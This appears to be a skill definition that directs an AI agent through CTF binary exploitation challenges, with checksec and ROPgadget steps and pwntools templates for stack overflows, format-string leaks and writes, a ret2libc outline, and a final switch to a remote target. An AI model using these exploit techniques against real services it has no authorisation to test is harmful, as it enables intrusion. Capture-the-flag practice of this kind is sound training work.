---
name: pwn
description: >-
  Solve CTF binary exploitation (pwn) challenges: buffer overflows,
  format strings, ROP chains, heap exploitation, and shellcoding.
  Use when given ELF/PE binaries with a remote service to exploit.
  Triggers: "buffer overflow", "format string", "ROP", "shellcode",
  "checksec", "NX", "canary", "PIE", "GOT overwrite", "ret2libc",
  pwntools scripts, .elf files, nc/netcat connection targets.
  Tools: checksec, ROPgadget, pwntools, gdb, one_gadget.
  NOT for static reverse engineering (use reverse).
---

# CTF Pwn

Analyze and exploit binary exploitation challenges.

## When to Use

Use this command for challenges involving:

- ELF binaries
- Buffer overflows
- Format string vulnerabilities
- ROP chains
- Heap exploitation

## Bundled Scripts

- [check-tools.sh](scripts/check-tools.sh) — Verify required pwn tools are installed
- [run-checksec.sh](scripts/run-checksec.sh) — Check binary protections (CANARY, NX, PIE, RELRO)

## Instructions

1. Check tool availability:

   ```bash
   bash scripts/check-tools.sh
   ```

   Expected: each tool prints `[OK]`. If any show `[MISSING]`, note which are unavailable before proceeding.

2. Run the pwn analysis:

   ```bash
   ctf run pwn $ARGUMENTS
   ```

   Expected output: binary type, architecture, and initial observations.

3. **CRITICAL: Check binary protections before attempting any exploit:**

   ```bash
   checksec ./binary
   ```

   Expected output:
   ```
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE
   ```

   **Read the output carefully — your exploit strategy depends on it:**

   | Protection | If Disabled | Exploit path |
   |------------|-------------|--------------|
   | CANARY | `No canary found` | Stack overflow directly exploitable |
   | NX | `NX disabled` | Inject and execute shellcode on stack |
   | PIE | `No PIE` | Use fixed addresses for ROP gadgets |
   | RELRO | `Partial RELRO` | GOT overwrite possible |

   **CRITICAL: If all protections are enabled, this is a harder challenge — consider heap exploitation or format string attacks instead of stack overflow.**

4. Run the binary and observe behavior:

   ```bash
   ./binary
   ```

   Expected: interactive prompt asking for input. Note what input it expects. Then trace calls:

   ```bash
   ltrace ./binary <<< "AAAA"
   ```

   Expected: library calls like `gets(...)`, `strcmp(...)`, `printf(...)`. Functions like `gets` or `scanf("%s")` indicate buffer overflow. `printf(user_input)` indicates format string vulnerability.

5. Find the offset to the return address:

   ```python
   from pwn import *
   print(cyclic(200))
   ```

   Feed the cyclic pattern to the binary. After crash, find offset:

   ```python
   cyclic_find(0x61616161)  # Replace with value from crash/core dump
   ```

   Expected: integer offset (e.g., `72`) — this is the padding needed before the return address.

6. Find ROP gadgets (if NX is enabled):

   ```bash
   ROPgadget --binary ./binary --re "pop rdi"
   ```

   Expected: `0x00401234 : pop rdi ; ret` — note the address for building the ROP chain.

   For x64: need `pop rdi; ret` for first argument. For x86: arguments go on the stack.

7. **Validation: Test exploit locally before targeting remote.**

   ```python
   from pwn import *
   p = process('./binary')
   payload = b'A' * offset + p64(target_address)
   p.sendline(payload)
   p.interactive()
   ```

   Expected: shell prompt or flag output. If it crashes, revisit steps 3-6 — the offset or target address may be wrong. Once working locally, switch to `remote(host, port)`.

## Common Attack Patterns

### Buffer Overflow (No Canary, No PIE)

```python
from pwn import *
p = process('./binary')
payload = b'A' * offset + p64(win_function)
p.sendline(payload)
p.interactive()
```

### Format String

```python
# Leak stack values
payload = b'%p ' * 20

# Write to address
payload = fmtstr_payload(offset, {target: value})
```

### ret2libc

```python
# Leak libc address
# Calculate base
# Call system("/bin/sh")
```

## Exploitation Checklist

1. Run binary, understand behavior
2. Check protections with checksec
3. Find vulnerability (overflow, format string)
4. Find offset to control
5. Build exploit (shellcode or ROP)
6. Test locally, then remote

## Example Usage

```bash
/ctf-kit:pwn ./challenge
/ctf-kit:pwn ./binary
```
